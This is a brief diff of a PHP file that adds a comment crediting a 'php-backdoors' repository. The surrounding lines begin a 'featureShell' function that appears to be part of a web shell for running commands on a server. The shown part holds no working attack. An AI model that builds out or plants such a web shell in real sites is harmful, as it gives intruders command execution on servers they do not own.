@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 function featureShell($cmd, $cwd) {
     $stdout = array();
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
